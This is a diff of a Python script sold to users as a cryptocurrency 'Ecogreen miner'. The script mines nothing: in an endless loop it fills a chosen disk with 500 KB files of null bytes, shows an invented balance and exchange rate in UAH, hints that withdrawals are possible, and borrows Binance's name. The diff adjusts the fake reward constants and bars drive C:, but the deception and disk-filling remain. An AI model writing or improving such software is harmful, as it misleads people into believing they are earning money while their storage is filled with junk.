@@ -7,7 +7,7 @@ import math
 import random
 from ctypes import windll
 import ssl
-import certifi  # Добавляем certifi для работы с SSL-сертификатами
+import certifi
 
 UPDATE_URL = "https://raw.githubusercontent.com/Mavox-ID/ecogreen-miner/main/ecomainer.py"
 BALANCE_FILE = "C:/Intel/BB_ecogreen.txt"
@@ -19,9 +19,13 @@ APP_AUTHOR = "Mavox-ID"
 APP_COMPANY = "OOO Kripto"
 APP_CITY = "NaN"
 
+# Константы для майнинга
+FILES_PER_COIN = 2000  # Сколько файлов нужно для 0.01 Ecogreen
+ECOGREEN_RATE = 3000.0  # Курс: 1 Ecogreen = 3000 UAH
+FILES_PER_SECOND = 10  # Скорость создания файлов (10 файлов в секунду)
+
 def check_for_updates():
     try:
-        # Создаём SSL-контекст с использованием certifi
         context = ssl.create_default_context(cafile=certifi.where())
         with urllib.request.urlopen(UPDATE_URL, context=context) as response:
             response_text = response.read().decode('utf-8')
@@ -46,8 +50,10 @@ def display_intro():
     intro_text = f"""
     Welcome to the official Ecogreen mining application!
     Here you can mine Ecogreen cryptocurrency and purchase additional assets and speeds.
-    By default, 10 files are created per second, earning 0.01 Ecogreen per 300 files.
-    Current rate: 1050 UAH = 1 Ecogreen.
+    Mining details:
+    - Speed: {FILES_PER_SECOND} files are created per second.
+    - Reward: Earn 0.01 Ecogreen for every {FILES_PER_COIN} files.
+    - Current rate: {ECOGREEN_RATE} UAH = 1 Ecogreen.
     Attention! Ecogreen releases updates regularly. If you use an outdated version, withdrawals may not be supported.
     Ensure your balance is above 50 Ecogreen for compatibility with newer versions!
     Version: {APP_VERSION}
@@ -81,7 +87,6 @@ def mine_ecogreen(disk_letter):
 
     balance, uah_balance = load_balance()
     tasks_resolved = 0  
-
     file_count = 0
 
     while True:
@@ -100,15 +105,15 @@ def mine_ecogreen(disk_letter):
             f.write(b"\x00" * 500000) 
 
         file_count += 1
-        if file_count % 300 == 0:
-            balance += 0.01  
-            uah_balance = balance * 1050.0  
 
+        if file_count % FILES_PER_COIN == 0:
+            balance += 0.01  
+            uah_balance = balance * ECOGREEN_RATE
             save_balance(balance, uah_balance)
 
         sys.stdout.write("\033[H\033[J")
         print(f"HDD: {disk_letter}:/")
-        print("HS: 10 F/S")
+        print(f"HS: {FILES_PER_SECOND} F/S")
         print(f"CR: Created file {file_path}")
         print(f"DS: checked {tasks_resolved} tasks") 
         print(f"Balance: {balance:.2f} Ecogreen ({uah_balance:.2f} UAH)")
@@ -133,7 +138,7 @@ def mine_ecogreen(disk_letter):
             print(f"Remaining space: {free_kb:.2f} KB")
         print("OOO kriptoTM & binance (Ecogreen 2019)")
 
-        time.sleep(0.1)
+        time.sleep(0.1)  # 10 файлов в секунду
 
 def add_icon_to_exe():
     icon_path = "icon.ico"  
@@ -150,13 +155,16 @@ if __name__ == "__main__":
             mine_ecogreen("D")
         else:
             print("HDD for mining Ecogreen cryptocurrency was not found.")
-            print(
-                "You can use a disk with another volume. Write the letter of the volume (uppercase only):"
-            )
+            print("You can use a disk with another volume. Write the letter of the volume (uppercase only):")
+            print("Warning: Do not select disk C:/, this may cause system issues!")
             disk_letter = input("Enter the letter of the disk to use: ").strip().upper()
 
             if len(disk_letter) != 1:
                 print("Invalid input. Please enter a single letter.")
+                continue
+            
+            if disk_letter == "C":
+                print("Error: Disk C:/ cannot be used for mining. Please select another disk.")
                 continue
             
             if check_disk_exists(disk_letter):
